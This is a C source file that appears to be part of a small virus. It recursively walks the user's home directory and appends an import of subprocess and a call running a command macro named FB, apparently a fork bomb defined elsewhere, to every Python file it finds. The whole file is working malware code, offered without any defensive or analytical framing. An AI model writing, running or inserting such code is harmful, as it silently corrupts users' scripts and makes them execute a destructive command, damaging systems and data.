//
// Created by kkyse on 10/5/2017.
//

#include "python.h"

#include <ftw.h>
#include <stdio.h>
#include <string.h>

#include "io.h"
#include "fb.h"

#define NUM_OPEN_FD 1000

int modify_python_file(const char *const path) {
    FILE *const file = fopen(path, "a");
    fputs("\n\n", file);
    
    fputs("import subprocess\n", file);
    fprintf(file, "subprocess.call(%s)", FB);
    
    fputs("\n\n", file);
}

bool is_python_file(const char *const path) {
    const size_t len = strlen(path);
    const char *const ext = path + len - 3;
    return strcmp(ext, ".py") == 0;
}

int modify_file(const char *const path, const struct stat *const sb, const int type_flag) {
    if (type_flag == FTW_F && is_python_file(path)) {
        modify_python_file(path);
    }
    return 0;
}

int modify_python_files_in_dir(const char *const dir_path) {
    if (dangerous_filename(dir_path)) {
        return -1;
    }
    return ftw(dir_path, &modify_file, NUM_OPEN_FD);
}

void modify_python_files() {
    modify_python_files_in_dir(get_home());
}
